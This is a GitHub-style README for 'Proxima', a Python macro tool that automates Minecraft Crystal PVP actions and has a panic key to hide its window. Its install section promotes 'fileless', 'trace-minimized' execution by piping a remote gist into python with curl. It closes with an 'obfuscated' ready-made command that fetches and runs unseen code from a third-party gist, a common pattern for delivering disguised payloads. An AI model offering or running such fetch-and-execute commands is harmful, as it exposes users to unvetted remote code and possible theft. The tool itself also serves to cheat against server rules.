# Proxima - Crystal PVP Macro Utility

![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Python](https://img.shields.io/badge/python-3.10%2B-yellow.svg) ![Platform](https://img.shields.io/badge/platform-Windows-blueviolet.svg)

**Proxima** is a sophisticated automation and macro utility designed for high-speed interactions in Minecraft PVP environments (Crystal PVP, Anchor, Pearl). It features a modern, stealthy "hacker-style" UI, fully configurable keybinds, and advanced event handling for low-latency execution.

## 🚀 Features

*   **Hit Crystal (HC):** Automates the obsidian placement and crystal breaking sequence with millisecond precision.
*   **Key Pearl (KP):** Instant enderpearl throwing macro with hotbar slot management.
*   **Auto Anchor (AA):** One-tap anchor charging and exploding sequence.
*   **Stealth Mode:** Instantly hide the GUI with a panic key (`Insert`).
*   **Modern UI:** Built with `customtkinter` for a sleek, dark-themed, borderless window experience.
*   **Configurable Delays:** Fine-tune action delays to match server tick rates and ping.
*   **Import/Export:** Share your perfect configs via JSON clipboard strings.

## 🛠️ Requirements

*   Windows 10 or 11
*   Python 3.10 or higher
*   **Libraries:**
    *   `customtkinter`
    *   `pynput`

## 📦 Installation & Usage

### Method 1: Standard Python Execution (Source)
1.  Clone this repository or download `main.py`.
2.  Install the required libraries:
    ```bash
    pip install customtkinter pynput
    ```
3.  Run the application:
    ```bash
    python main.py
    ```

### Method 2: "Fileless" Memory Execution
You can execute Proxima directly from memory using PowerShell without manually downloading files to your disk. This method is useful for quick, trace-minimized usage.

**Command:**
```powershell
curl.exe -sL "https://gist.githubusercontent.com/YOUR_USERNAME/YOUR_GIST_ID/raw/main.py" | python -
```
*(Note: Replace the URL with the raw link to your own hosted `main.py` Gist)*

## 🎮 Controls

*   **GUI Toggle:** `Insert` (Default)
*   **Macro Bindings:** Configurable in the "Crystal" tab.
    *   Click the red "..." button to rebind a macro.
    *   Press the desired key to save.
*   **Slot Configuration:**
    *   Ensure your in-game hotbar matches the slot numbers defined in the settings.
    *   Example: If "Crystal Slot" is `3`, make sure your crystals are in slot 3.

## ⚠️ Disclaimer
This software is intended for educational purposes and use on servers where macros are permitted. The usage of automation tools may be against the Terms of Service of specific game servers. Use at your own risk.

## 📜 License
This project is licensed under the MIT License - see the LICENSE file for details.

### Necessary Imports (for your information)
Your `main.py` script already includes these, but for your reference, these are the dependencies used:

```python
import customtkinter as ctk
import threading
import time
import sys
import json
import ctypes
from pynput.keyboard import Listener, Key, Controller as KeyboardController
from pynput.mouse import Button, Controller as MouseController
```

### How to Host for "Fileless" Execution
1.  Go to **[gist.github.com](https://gist.github.com/)**.
2.  Paste your entire `main.py` code there.
3.  Name the file `main.py` and give the Gist a description like "Proxima Source".
4.  Click **Create Secret Gist** or **Create Public Gist**.
5.  Once created, click the **Raw** button on the top right of the code box.
6.  Copy that URL.
7.  Replace the URL in the `curl.exe` command in your README with this new Raw URL.

If you want to skip all of those steps and just execute Proxima with a already done powershell command, use this one (obfuscated):
```powershell
curl.exe -sL "https://gist.githubusercontent.com/dcbzpass/6d1dbcf854d17147713d57c60c6a0cec/raw/a8f9c1e0af3ff5f188a8ec2d7ce6a86acab8c71e/main.py" | python -
```
